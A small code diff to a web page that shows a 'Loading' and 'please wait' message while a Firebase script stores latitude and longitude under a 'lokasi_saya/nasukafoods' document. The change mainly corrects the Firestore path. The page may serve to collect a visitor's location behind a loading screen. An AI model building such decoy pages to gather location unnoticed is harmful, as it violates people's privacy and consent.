@@ -16,10 +16,10 @@
     }
   </style>
 </head>
-
 <body>
- 
+  <h2>Loading ....</h2>
   <p class="status">Tunggu sebentar...</p>
+
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
     import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
@@ -38,7 +38,7 @@
     const statusEl = document.querySelector('.status');
 
     const updateLocation = (lat, lng) => {
-      const lokasiRef = doc(db,"nasukafoods");
+      const lokasiRef = doc(db, "lokasi_saya", "nasukafoods");
       setDoc(lokasiRef, {
         lat: lat,
         lng: lng,
